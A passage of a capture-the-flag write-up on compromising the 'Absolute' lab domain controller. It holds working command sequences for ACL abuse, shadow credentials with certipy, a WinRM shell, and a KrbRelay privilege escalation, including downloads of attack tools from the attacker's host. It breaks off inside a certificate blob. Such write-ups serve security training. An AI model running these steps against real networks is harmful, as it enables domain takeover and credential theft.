#### Bloodhound

I’ll mark svc_smb owned:

![image-20230522153411507](/img/image-20230522153411507.png)
Unfortunately, the permissions are the same as d.klay.

#### SMB

As svc_smb, I get read access to several shares:

```
oxdf@hacky$ crackmapexec smb dc.absolute.htb -k -u svc_smb -p 'AbsoluteSMBService123!' --shares
SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
SMB         dc.absolute.htb 445    DC               [+] Enumerated shares
SMB         dc.absolute.htb 445    DC               Share           Permissions     Remark
SMB         dc.absolute.htb 445    DC               -----           -----------     ------
SMB         dc.absolute.htb 445    DC               ADMIN$                          Remote Admin
SMB         dc.absolute.htb 445    DC               C$                              Default share
SMB         dc.absolute.htb 445    DC               IPC$            READ            Remote IPC
SMB         dc.absolute.htb 445    DC               NETLOGON        READ            Logon server share 
SMB         dc.absolute.htb 445    DC               Shared          READ            
SMB         dc.absolute.htb 445    DC               SYSVOL          READ            Logon server share
```

Now I have access to Shared . I’ll connect with smbclient.py :

```
Shared
```

```
smbclient.py
```

```
oxdf@hacky$ smbclient.py 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
Type help for list of commands
# use shared
# ls
drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 .
drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 ..
-rw-rw-rw-         72  Thu Sep  1 13:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Thu Sep  1 13:02:23 2022 test.exe
```

There’s two files. I’ll download both:

```
# get compiler.sh
# get test.exe
```

compiler.sh is a single line, used to compile a Nim program. test.exe is a Windows 64-bit exe:

```
compiler.sh
```

```
test.exe
```

```
oxdf@hacky$ file test.exe 
test.exe: PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows
```

It’s probably written in Nim.

### Dynamic Analysis

I’ll move over to a Windows machine and give this a run. Nothing happens. I’ll run with Wireshark, and notice that there’s a bunch of DNS queries going out:

![image-20230522154143073](/img/image-20230522154143073.png)
I’ll update my hosts file to include _ldap._tcp.dc.absolute.htb , and re-run the program. After 25-30 seconds after execution, there’s an attempt to bind to LDAP on Absolute:

```
hosts
```

```
_ldap._tcp.dc.absolute.htb
```

Click for full size image

![image-20230522154437465](/img/image-20230522154437465.png)
Following that stream, it looks like there may be creds in there:

![image-20230522154514432](/img/image-20230522154514432.png)
It’s getting the same AcceptSecurityContext error that I got above when using NTLM. Digging into the bindRequest(1) packet in Wireshark, there are creds for mlovegod:

```
AcceptSecurityContext
```

```
bindRequest(1)
```

![image-20230522154622698](/img/image-20230522154622698.png)

### Validate Creds

These creds actually don’t work as they are in the binary:

```
oxdf@hacky$ crackmapexec smb 10.10.11.181 -u mlovegod -p 'AbsoluteLDAP2022!' -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\mlovegod:AbsoluteLDAP2022! KDC_ERR_C_PRINCIPAL_UNKNOWN
```

That username isn’t known, and it doesn’t fit the format for the other accounts. There is a m.lovegod in the users identified above over LDAP. That works:

```
oxdf@hacky$ crackmapexec smb 10.10.11.181 -u m.lovegod -p 'AbsoluteLDAP2022!' -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
```

## Shell as winrm_user

### Bloodhound

m.lovegod owns the Network Audit group, which has GenericWrite on the winrm_user user:

```
GenericWrite
```

![image-20230522155353341](/img/image-20230522155353341.png)
m.lovegod is a member of three groups, but not Network Audit:

![image-20230522155511238](/img/image-20230522155511238.png)
winrm_user is a member of Remote Management Users, which means that they can connect to WinRM and get a shell:

![image-20230522155706485](/img/image-20230522155706485.png)

### Strategy

To get access to winrm_user, I’ll first I’ll need to give m.lovegod write access on the Network Audit group. Then I can add m.lovegod to the group. Finally, I can use those permissions to create a shadow credential for the winrm_user account.

The first two steps are much easier to do on Windows (and Bloodhound tells you the commands to run). I’ll show both Windows and Linux.

The “Shadow Credential” technique involves manipulating the user’s msDS-KeyCredentialLink attribute, which binds a credential to their account that I can then use to authenticate. This technique is much less disruptive than just changing the user’s password. This post from Spector Ops has a ton of good detail.

```
msDS-KeyCredentialLink
```

### Add m.lovegod to Network Audit

#### Windows

Bloodhound gives the abuse info for doing this:

![image-20230522164623610](/img/image-20230522164623610.png)
To get this attack to work, I had to configure Absolute’s IP as a DNS server for my VPN interface:

![image-20230523132312087](/img/image-20230523132312087.png)
In PowerShell, I’ll import PowerView , and create a credential:

```
PS > $pass = ConvertTo-SecureString 'AbsoluteLDAP2022!' -AsPlainText -Force
PS > $cred = New-Object System.Management.Automation.PSCredential('absolute.htb\m.lovegod', $pass)
```

If I try to run the command just like above, it will say that -PrincipleIdentity is required. Looking at the docs , I’ll add that and the -DomainController options.

```
-PrincipleIdentity
```

```
-DomainController
```

```
PS > Add-DomainObjectAcl -Credential $cred -TargetIdentity "Network Audit" -Rights All -PrincipalIdentity m.lovegod -DomainController dc.absolute.htb
```

Now to add m.lovegod to the group, I’ll use another PowerView commandlet, Add-DomainGroupMember :

```
PowerView
```

```
Add-DomainGroupMember
```

```
PS > Add-DomainGroupMember -Credential $cred -Identity "Network Audit" -member m.lovegod -Domain "absolute.htb"
```

It works:

```
PS > Get-DomainGroupMember -Credential $cred -Identity "Network Audit" -Domain "absolute.htb" -DomainController "dc.absolute.htb" | fl MemberName

MemberName : svc_audit
MemberName : m.lovegod
```

There is a script reverting these memberships periodically, so if one fails, I’ll start at the beginning and re-enable the access.

#### Linux

There is a neat Impacket script that hasn’t been merged yet in this pull request for a script. It provides an example script called dacledit.py that does the same thing that Add-DomainObject Acl does.

```
dacledit.py
```

```
Add-DomainObject Acl
```

I’ll clone this repo , checkout the dacledit branch, and install:

```
dacledit
```

```
oxdf@hacky$ git clone https://github.com/ShutdownRepo/impacket.git impacket-dacl                                                  
Cloning into 'impacket-dacl'...
remote: Enumerating objects: 22819, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 22819 (delta 6), reused 9 (delta 6), pack-reused 22807
Receiving objects: 100% (22819/22819), 8.07 MiB | 39.92 MiB/s, done.
Resolving deltas: 100% (17414/17414), done.
oxdf@hacky$ cd impacket-dacl
oxdf@hacky$ pip install .
...[snip]...
```

Now I can run the script from anywhere on my host:

```
oxdf@hacky$ dacledit.py -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights WriteMembers
Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] DACL backed up to dacledit-20230523-004341.bak
[*] DACL modified successfully!
```

This is adding the WriteMembers permission to m.lovegod. This script doesn’t use any existing ticket, so I’m giving it a full username and password.

```
WriteMembers
```

To add the user to the group, I’ll use net (which installs with apt install samba ). The most reliable way to use this is with --use-kerberos=required , though for some reason it asks for a password on each run. Still it works, as m.lovegod isn’t in the group, then I add them, and then they are:

```
net
```

```
apt install samba
```

```
--use-kerberos=required
```

```
oxdf@hacky$ net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
absolute\svc_audit
oxdf@hacky$ net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
oxdf@hacky$ net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
absolute\m.lovegod
absolute\svc_audit
```

Alternatively, if I use -k , it will use my ticket from kinit . I found I had to delete that ticket and re-initialize it often or I would get errors:

```
-k
```

```
kinit
```

```
oxdf@hacky$ rm /tmp/krb5cc_1000 
oxdf@hacky$ kinit m.lovegod
Password for m.lovegod@ABSOLUTE.HTB: 
oxdf@hacky$ net rpc group members "Network Audit" -U 'm.lovegod' -k -S dc.absolute.htb
absolute\svc_audit
oxdf@hacky$ net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' -k -S dc.absolute.htb
oxdf@hacky$ net rpc group members "Network Audit" -U 'm.lovegod' -k -S dc.absolute.htb
absolute\m.lovegod
absolute\svc_audit
```

### Shadow Credential

In Outdated, I showed how to do this on target using Whisker and remotely with PyWhisker . PyWhisker would work here, but Certipy has the several steps packaged into one command, so I’ll show that here. It installs with pip install certipy-ad .

```
pip install certipy-ad
```

certipy find will return all sorts of information about the domain and how Active Directory Certificate Services (ADCS) is configured. It doesn’t check /tmp/krb5cc by default, so I’ll need to set that environment variable to be able to use it:

```
certipy find
```

```
/tmp/krb5cc
```

```
oxdf@hacky$ KRB5CCNAME=/tmp/krb5cc_1000 certipy find -username m.lovegod@absolute.htb -k -target dc.absolute.htb 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'absolute-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'absolute-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'absolute-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'absolute-DC-CA'
[*] Saved BloodHound data to '20230523213024_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230523213024_Certipy.txt'
[*] Saved JSON output to '20230523213024_Certipy.json'
```

I can look at this, but right now this is just a good sign that ADCS is installed.

This next command needs a Kerberos ticket to work, and it seems like it must be generated after the m.lovegod user has been added to the group. The following error means that I need to delete my ticket and re-create it (either with kinit or getTGT.py ):

```
kinit
```

```
getTGT.py
```

```
[-] Could not update Key Credentials for 'winrm_user' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (
INSUFF_ACCESS_RIGHTS), data 0
```

certipy shadow auto will add the shadow credential to the winrm_user user:

```
certipy shadow auto
```

```
oxdf@hacky$ KRB5CCNAME=/tmp/krb5cc_1000 certipy shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2608415b-4088-a5fd-bc55-20c685887995'
[*] Adding Key Credential with device ID '2608415b-4088-a5fd-bc55-20c685887995' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID '2608415b-4088-a5fd-bc55-20c685887995' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Using principal: winrm_user@absolute.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```

This has created a credential and given both the NT hash (which isn’t useful for me here) and saved a ticket in winrm_user.ccache .

```
winrm_user.ccache
```

### Shell

I’ll use the new cred to get an evil-winrm shell:

```
evil-winrm
```

```
oxdf@hacky$ KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\winrm_user\Documents>
```

And grab user.txt :

```
user.txt
```

```
*Evil-WinRM* PS C:\Users\winrm_user\Desktop> type user.txt
b3fb6413************************
```

## Shell as administrator

### KrbRelay Background

A very popular Kerberos-based attack for the last couple years has been KrbRelay. This technique was first discussed in a Google Project Zero post on October 2021, and then Cube0x0 made a public POC, KrbRelay in February 2022. In Aprl 2022, KrbRelayUp automated the most common pathways from KrbRelay

The idea is to relay an authentication request through a server back to the DC to get authenticated for whatever mischief the attacker desires.

After a full year of this bug being referred to as “not to be patched”, Microsoft changed their stance and did that in October 2022.

This MS patch also effects krbrelay. It looks like we had our fun with rpc->ldap https://t.co/lAWJltswBg

For this attack to work, the target must:

- Not have the Oct 2022 patches;
- LDAP signing must be disabled (which is the Windows default).
In theory, crackmapexec might be able to check LDAP signing, but as of the time of my solving, it has a bug that causes it to fail here (I’ve raised this with the devs…hopefully it’ll be fixed soon!):

```
crackmapexec
```

```
oxdf@hacky$ crackmapexec ldap 10.10.11.181 -u m.lovegod -p 'AbsoluteLDAP2022!' -M ldap-checker -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.181    389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
LDAP-CHE... 10.10.11.181    389    DC               [-] [!!!] invalid credentials - aborting to prevent unnecessary authentication

[*] Shutting down, please wait...
```

I don’t have a great way to check if LDAP signing is enabled. Given that disabled is the Windows default, and that the box was released in September 2021 (before the patch was released), it’s a wise thing to try.

### KrbRelay

#### Compile

I’ll clone the repo to my Windows host and open the .sln file in Visual Studio. I’ll go to Built > Batch Build to get this dialog:

```
.sln
```

![image-20230523164307773](/img/image-20230523164307773.png)
I’ll select both release configurations for Build, and click Build. There are a fair number of warnings, but it reports success and gives an .exe path for each binary:

```
.exe
```

```
Build started...
------ Build started: Project: CheckPort, Configuration: Release Any CPU ------
  CheckPort -> C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
------ Build started: Project: KrbRelay, Configuration: Release Any CPU ------
C:\Tools\KrbRelay\KrbRelay\IStorage\ILockBytes.cs(24,23,24,61): warning CS0618: 'STATSTG' is obsolete: 'Use System.Runtime.InteropServices.ComTypes.STATSTG instead. http://go.microsoft.com/fwlink/?linkid=14202'
...[snip]...
C:\Tools\KrbRelay\KrbRelay\Misc\Natives.cs(320,24,320,26): warning CS0649: Field 'Natives.SOLE_AUTHENTICATION_SERVICE.hr' is never assigned to, and will always have its default value 0
  KrbRelay -> C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe
========== Build: 2 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
```

I’ll copy both binaries back to my Linux box and upload them to Absolute.

```
*Evil-WinRM* PS C:\programdata> wget 10.10.14.6/KrbRelay.exe -outfile KrbRelay.exe
*Evil-WinRM* PS C:\programdata> wget 10.10.14.6/CheckPort.exe -outfile CheckPort.exe
```

#### Find Port

CheckPort.exe will identify the port that the malicious server will run on:

```
CheckPort.exe
```

```
*Evil-WinRM* PS C:\programdata> .\CheckPort.exe
[*] Looking for available ports..
[*] SYSTEM Is allowed through port 10
```

It identifies port 10.

#### Identify CLSID

Very similar to how many of the Potato attacks work, I’ll need a CLSID for a valid RPC service with the correct permissions. There are tools to discover these on the target host, but it’s often easier and faster just to pick from some of the default ones listed.

This host is running Windows 10.0.17763.3406:

```
*Evil-WinRM* PS C:\programdata> cmd /c ver

Microsoft Windows [Version 10.0.17763.3406]
```

That maps to server 2019 or Windows 10. There’s a list of default CLSIDs by OS on the KrbRelay README .

```
354ff91b-5e49-4bdc-a8e6-1cb6c6877182
```

#### Fail

I’ll run this now with the syntax from the README.md , and it fails:

```
README.md
```

```
*Evil-WinRM* PS C:\programdata> .\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-groupmember "Domain Admins" winrm_user
[*] Relaying context: absolute.htb\DC$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\programdata\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAADTTE0VYrMdRI8wZk6Yn8FkAvwAABQG//+TcgcMhZchfSIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 354ff91b-5e49-4bdc-a8e6-1cb6c6877182
System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
   at KrbRelay.Ole32.CoGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsid, Object pUnkOuter, CLSCTX dwClsCtx, IStorage pstg, UInt32 cmq, MULTI_QI[] rgmqResults)
   at KrbRelay.Program.Main(String[] args)
```

This failure is due to the fact that the exploit requires an interactive session, such as a console. In these sessions, credentials are stored in memory, and thus accessible to the exploit, as opposed to in the WinRM remoting that I have now.

#### RunAsCs

RunAsCs is a tool that allows for running as different users with creds. I’ll download the release and upload it to Absolute.qq

I’ve got creds for m.lovegod, so I’ll wrap my previous command in RunasCs.exe with that username and password and -d to give the domain. It fails:

```
RunasCs.exe
```

```
-d
```

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb ".\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-groupmember administrators winrm_user"
[-] RunasCsException: Selected logon type '2' is not granted to the user 'm.lovegod'. Use available logon type '3'.
```

It’s trying to create a logon type 2 process, which is blocked (presumably due to NTLM’s being disabled). It suggests to use type 3, but that fails as well.

This Microsoft page has a table of logon types. Runas / Network are the examples for type 9. I’ll try that:

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 ".\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-groupmember administrators winrm_user"            

[*] Relaying context: absolute.htb\DC$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System                              
[*] Init com server
[*] GetModuleFileName: C:\programdata\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABTTPeSTipF2z9FHjLk0cIbAuwAADQI//+R7UMqWjylmyIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:
[*] Forcing SYSTEM authentication
[*] Using CLSID: 354ff91b-5e49-4bdc-a8e6-1cb6c6877182
[*] apReq: 6082070806092a864886f71201020201006e8206f7308206f3a003020105a10302010ea20703050020000000a382052b6182052730820523a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64632e6162736f6c7574652e687462a38204e6308204e2a003020112a103020104a28204d4048204d03db8f428f745cc616e4aa91d3ea195a7f6d8a29f3fa3e775af505da6fda12113faf706ddc34ffa41df0ef0ac09ccfbea3ff48b50dab86842ac5d93f183a1553efc85519d1fadf3bba6cc0cb5595a0f03c0ad7b5d0535c8f39eb7f339b4320ac90a39ee3700e2d4e21e720d5c6d3058dd9ceacab2f892f0ef879f9cf3d71421ae3bc3959940917600238181aae792bbf360f200a803194e5800edc648ee39f0c0a362b894f453bf3a815e0443827d342fd3854dd1582b4e76cff9bc5e72a873bcb2e34e47c2a26596bc4a83806468a697ab6cf804ff02342b0be82661f891c3c2f4af146a4f453ac76659d5d5bd529e0e0992e519d46211ba6df2f613dbf1c48d8fce86f169762e7023c854329ac8780b3e3c916f2fc1f769cc6715fea54ddc5a08ab947ced0123dce3a9c6359cd3ce9d72b9a97448cb396d3de3e01dfb53b2d0160d5d561ba9b6c526361d723d0a79b1e6d02dba9548b8318179220edf194b3917d83870887d0740b94695a1c3210722b7e98f90959fe80c00b4743a6bbc607700d5114a2565a0cf7c2a783417c4233421ea53c6726136b13085cec3dbcc3dcc7d4e8b8a25ed0ba3e19124625bab2db2258b17c69744674b03a53160589c75d5b61b0cde421d96cce059cac230343757e7d5de7eaa2f77445c3fcfa70d11bc40aee4a48a4b858d159ebfcc75e61a4146794f09b2ffd0596b51f3baa158a9fb3f7ab736806e0783b06fdfe6ce82b35f2492e25e3f0ed6493660fa7c3b15c1137adc9431580d79db3687ce5e29151e42238ec7d936b8223f8dd057b9ed5943d6330a4e79628a2f11c4181c7051656721e43985754eeab748fdcc0c932dd1a37a4d3f4c4a19b38f13328668a0211001fb2a5ca45207da50df64534b726a7a594c54858e79a7c1f8c5c8db4c5b57ae8bd237228ebadb6c0b1a09c9510d1a553e2bc117b8803f56fce012fdbb9eb16bc8deeeaefd0764d943777dbe77dfbf4f5a12d25dc7d9ab8d3cdae1f3491786998ec0e11db2300eff8c0a7548b378dfae9acf0a8a05613fffceecd2de6200f67d655f598b25911b93d1c91beabde4b910f066a4a58aa186599e0d7fbd56bc60c702ab150fef9d95df51cbe851a7c8ad2b1d04d26bd0e69e1402a04190e0175275dbb7333cc176be3fa21ab137bc2e573c3706c3b023c2e144c0cb2e71d5b0f76ea54f5512792eada0a823e4a175d3fe7b4b4a346e32a36173714fd3d41c508bfdf70f785063de5f060c59ea07e8ac0def73c902bc29df3b0d05b8ced0ceee18d1169d2f82f4fee13682d279f084423522be7a742ca45e91d03c5841d8a21c602f1912688b5fb022764e5f361371c377ce8f067f5742cc41ed5c4c82eeee65256b21cb14b03e117fd7d48f50aa42edd100b2d161eb8bcf506991320291906f75c0c9babaeaf473d81a4d44b640dbcaae529c5659e8a5912e7a943824b6f07b655c1eeb54cf3246abd6ce9563717c436c0638547bd9a64336c39f7228f056a0a612cc57f0121b51e7479d4f58634744d6618190bfdcc6938991ea9053898663f4965363473595fcd715ca591e57472c405151793dc5b368334b5a5671453e7307ce0b1a060374fb50afa1fef89baf6c2642d064411d77b74711880ab15405b6aa809f05098bb74c247b5bd3d7c6185b47ba58c9ec84cd85915ee2f4d3d86408aaeb0fce51d686e783eb85865d52db94214c446749434a0deb7b44dcb0db122573c4efab06a48201ad308201a9a003020112a28201a00482019ce9e4d5a5d1216dd3418541a394c393bdcf3cdb62848be82577c1ad90d531576ae2128a84a994d32ec6d85d201143c3919726658b534fcfb4a789de7a65e20b2a209136bd8ba1c4b608ea3e417e6fdbf4addd5f8cd1274920c2abf8fbf0883452b7a26347f4e75b33e46bfa2bd2a654f2b891c352bab1f38f920e987316055f62d88926500f428971f49077bffc70013b279b909d325e3b7f0d27e6716f6305663b722f172b3b1d964ef9cf5ea7fc1b6dc3feb4dee5f84cb35c428a8d1c0013381a282ef16a3a6bd77a0325d7b10aa407c8d4289b2756b31e22e0f2e507d9157a009072576c4adead710b6e5e6d19e77458590b77077b709ac0c866d676a590564fc6d7393624007bc4c462fcf53ccd28fd04c1dd8dfb0691055ed2838531623fc4ae6e6908847e0e16ae0fcaf9f94b7b80d14dcfa0851f6afb5e8ba6a6b56b9f5b2da2b94b41bb121270badfeb2308e8161f80372f9d9a9110823ae448ad1b6de8a2257802bde7279077b701d61baf1e5f36b316587c40995f7a9be54a71b8da8bd569024d4e19bc4cba0ff8f452cd77a286077b9b21fa39f77b5218
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046e566490e116b76a430cfeb20fcff3261390aadcd3d53b88fc370854ed454645ca5a18405acdc7823d58783f122ed52055363d7e26aa08d5f875e4b22ddd1d3f086017c4ff2e9c8541b1192e5460114f7125db5e48
5d4feed2302f8a05c322a575c82042ba97f58d21b9c6b6220a02
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a2440442f51da74c39cd58d005b6e656be9d40011b917a1e192561155115f922fe21188a3294714e38cbbe9cf20e5017f9b364755847f070bd48664b9e8c08118468df88d1c2                                        
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
[*] ldap_modify: LDAP_SUCCESS
```

It reports success. And winrm_user is in the Administrators group:

```
*Evil-WinRM* PS C:\programdata> net user winrm_user
User name                    winrm_user
...[snip]...

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *Protected Users
The command completed successfully.
```

And can read root.txt :

```
root.txt
```

```
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
adce565c************************
```

### KrbRelayUp

#### Failures

KrbRelayUp takes common attack paths with KrbRelay and automates them. Unfortunately, none of them quite work here. I’ll download a copy from SharpCollection and upload it to Absolute.

```
*Evil-WinRM* PS C:\programdata> wget 10.10.14.6/KrbRelayUp.exe -outfile KrbRelayUp.exe
```

Just like above, I’ll need to run it in a active session with RunasCs . It seems to work:

```
RunasCs
```

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 ".\KrbRelayUp.exe relay -m shadowcred -cls {354ff91b-5e49-4bdc-a8e6-1cb6c6877182}"

KrbRelayUp - Relaying you to SYSTEM

[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] Generating certificate
[+] Certificate generated
[+] Generating KeyCredential
[+] KeyCredential generated with DeviceID 3dc34180-dab1-44d7-83a8-3d86521dd0b9
[+] KeyCredential added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m shadowcred -d absolute.htb -dc dc.absolute.htb -ce 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